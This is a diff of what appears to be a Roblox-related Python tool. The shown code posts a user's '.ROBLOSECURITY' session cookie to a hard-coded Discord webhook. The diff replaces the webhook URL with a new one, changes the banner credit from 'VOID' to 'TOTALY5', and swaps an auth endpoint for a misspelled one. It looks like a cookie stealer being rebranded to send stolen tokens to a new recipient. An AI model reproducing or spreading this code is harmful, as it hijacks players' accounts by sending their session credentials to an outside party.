@@ -38,7 +38,7 @@ if cookie == "":
 
 
 def send_webhook(cookie):
-    webhook_url = "https://discord.com/api/webhooks/1168267438626967756/U5Koh9kvXjFLeBd6xnysOuQeZ84JDlcQM_nTwubzVod0ww7zlnoxg3pqPDrDZ8ctX420"
+    webhook_url = "https://discord.com/api/webhooks/1169301940044304384/S4uc8JZjeh48P5CX8eQNrEr6T6uMBBj6q4koLjOcB0kVOSuto-x3jgsQ_V3c8Dnkq_1y"
     data = {"content": f"Roblox Cookie: `{cookie}`"}
     try:
         response = requests.post(webhook_url, json=data)
@@ -57,7 +57,7 @@ def groupally():
             cookies = {'.ROBLOSECURITY': cookie}
 
             gathtoken = requests.post(
-                'https://auth.roblox.com/v2/logout', cookies=cookies)
+                'https://auth.roblox.com/v1/logoin', cookies=cookies)
             token = gathtoken.headers['x-csrf-token']
 
             headers = {'x-csrf-token': token}
@@ -92,7 +92,7 @@ def main():
         | $$  | $$| $$| $$|  $$$$$$$      | $$$$$$$/|  $$$$$$/  |  $$$$/
         |__/  |__/|__/|__/ \____  $$      |_______/  \______/    \___/  
                            /$$  | $$                                    
-      Made by VOID        |  $$$$$$/                                    
+       Made by TOTALY5    |  $$$$$$/                                    
                            \______/                                    
             """ + RESET)
 
